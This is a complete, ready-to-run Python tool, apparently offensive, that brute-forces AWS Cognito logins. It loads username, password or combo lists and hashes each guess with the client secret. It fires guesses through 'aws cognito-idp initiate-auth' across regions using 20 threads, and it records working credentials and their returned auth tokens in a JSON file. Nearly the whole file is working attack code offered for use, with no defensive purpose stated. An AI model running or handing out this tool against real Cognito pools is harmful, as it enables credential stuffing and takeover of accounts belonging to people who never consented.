import concurrent.futures
import threading
import hmac
import hashlib
import base64
import subprocess
import sys
import argparse
import json
from itertools import product

# Hacker Colors
HACKER_GREEN = "\033[92m"
HELL_RED = "\033[91m"
DARK_MAGENTA = "\033[35m"
WARNING_YELLOW = "\033[93m"
ICE_CYAN = "\033[96m"
WHITE = "\033[97m"
RESET = "\033[0m"

REGIONS = [
    "us-east-1", "us-west-1", "us-west-2",
    "eu-central-1", "eu-west-1",
    "ap-southeast-1", "ap-northeast-1", "ap-south-1"
]

region_lock = threading.Lock()
username_lock = threading.Lock()
locked_region = None
rate_limited_users = set()
results_lock = threading.Lock()
results = []
json_output_enabled = False  # toggled by --json flag

def compute_secret_hash(username, client_id, client_secret):
    """Compute Cognito HMAC SHA256 Secret Hash."""
    msg = username + client_id
    dig = hmac.new(client_secret.encode('utf-8'), msg.encode('utf-8'), hashlib.sha256).digest()
    return base64.b64encode(dig).decode()

def write_result(result_data):
    """Append result to JSON if --json flag is set."""
    if not json_output_enabled:
        return
    with results_lock:
        results.append(result_data)
        with open("results.json", "w") as outfile:
            json.dump(results, outfile, indent=4)

def attempt_login(region, username, password, client_id, client_secret):
    """Attempt AWS Cognito login and handle rate limiting, success, or unconfirmed states."""
    with username_lock:
        if username in rate_limited_users:
            return "skip"

    secret_hash = compute_secret_hash(username, client_id, client_secret)
    try:
        result = subprocess.run([
            "aws", "cognito-idp", "initiate-auth",
            "--region", region,
            "--client-id", client_id,
            "--auth-flow", "USER_PASSWORD_AUTH",
            "--auth-parameters", f"USERNAME={username},PASSWORD={password},SECRET_HASH={secret_hash}"
        ], capture_output=True, text=True, check=False)

        if result.returncode == 0:
            print(f"{HACKER_GREEN}[🐸 SUCCESS]{RESET} {region} => {username}:{password}")
            print(result.stdout)
            write_result({
                "region": region,
                "username": username,
                "password": password,
                "status": "success",
                "response": result.stdout
            })
            return "success"

        if "ResourceNotFoundException" in result.stderr:
            return "bad_region"

        if "UserNotConfirmedException" in result.stderr:
            print(f"{DARK_MAGENTA}[🔎 UNCONFIRMED]{RESET} {region} => {username}:{password} -> User not confirmed")
            write_result({
                "region": region,
                "username": username,
                "password": password,
                "status": "unconfirmed"
            })
            return "unconfirmed"

        if "NotAuthorizedException" in result.stderr:
            if "Password attempts exceeded" in result.stderr:
                with username_lock:
                    if username not in rate_limited_users:
                        rate_limited_users.add(username)
                        print(f"{WARNING_YELLOW}[🚨 RATE LIMITED] {region} => {username} -> Password attempts exceeded. Skipping user...{RESET}")
                return "rate_limited"
            print(f"{HELL_RED}[❌ INVALID]{RESET} {region} => {username}:{password} -> Invalid credentials")
            return "invalid"

    except Exception as e:
        print(f"{HELL_RED}[💀 ERROR]{RESET} {region} => {username}:{password} -> {str(e)}")
    return "fail"

def worker(user, pwd, client_id, client_secret):
    """Worker that attempts login, respects rate limiting, success, and unconfirmed early exit."""
    global locked_region
    with username_lock:
        if user in rate_limited_users:
            return

    if locked_region:
        status = attempt_login(locked_region, user, pwd, client_id, client_secret)
        if status in ["success", "rate_limited", "unconfirmed"]:
            with username_lock:
                rate_limited_users.add(user)
    else:
        for region in REGIONS:
            with username_lock:
                if user in rate_limited_users:
                    break
            status = attempt_login(region, user, pwd, client_id, client_secret)

            if status == "invalid":
                with region_lock:
                    if not locked_region:
                        locked_region = region
                        print(f"{HACKER_GREEN}[✅ REGION LOCKED] {locked_region}{RESET}")
                break

            if status in ["success", "rate_limited", "unconfirmed"]:
                with username_lock:
                    rate_limited_users.add(user)
                break

def parse_combo_file(file_path):
    """Parse combo file formatted as user:pass or user,pass."""
    users, passwords = set(), set()
    with open(file_path, 'r') as f:
        for line in f:
            if not line.strip():
                continue
            if ':' in line:
                user, pwd = line.strip().split(':', 1)
            elif ',' in line:
                user, pwd = line.strip().split(',', 1)
            else:
                continue
            users.add(user.strip())
            passwords.add(pwd.strip())
    return sorted(users), sorted(passwords)

def parse_file_list(file_path):
    """Parse generic file with one item per line."""
    items = set()
    with open(file_path, 'r') as f:
        for line in f:
            if line.strip():
                items.add(line.strip())
    return sorted(items)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="⚡ Cognito Brute Force ⚡")
    parser.add_argument("client_id", help="Cognito App Client ID")
    parser.add_argument("client_secret", help="Cognito App Client Secret")
    parser.add_argument("-c", "--combo", help="Combo file (user:pass or user,pass)")
    parser.add_argument("-u", "--usernames", help="Username list file")
    parser.add_argument("-p", "--passwords", help="Password list file")
    parser.add_argument("-t", "--threads", type=int, default=20, help="Number of threads (default=20)")
    #Going to fast will mess you up quick be warned by this comment
    parser.add_argument("--json", action="store_true", help="Enable JSON output to results.json")
    args = parser.parse_args()

    json_output_enabled = args.json

    if not args.combo and (not args.usernames or not args.passwords):
        print(f"{ICE_CYAN}Usage:{RESET} python cognito_brute_final_safe.py <client_id> <client_secret> -c <combo> OR -u <users> -p <passwords>")
        sys.exit(1)

    if args.combo:
        users, passwords = parse_combo_file(args.combo)
    else:
        users = parse_file_list(args.usernames)
        passwords = parse_file_list(args.passwords)

    print(f"{WHITE}[*] Loaded {len(users)} users and {len(passwords)} passwords{RESET}")

    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = []
        for user, pwd in product(users, passwords):
            futures.append(executor.submit(worker, user, pwd, args.client_id, args.client_secret))
        concurrent.futures.wait(futures)

    if json_output_enabled:
        print(f"{ICE_CYAN}[*] Brute-force complete. Results saved to results.json{RESET}")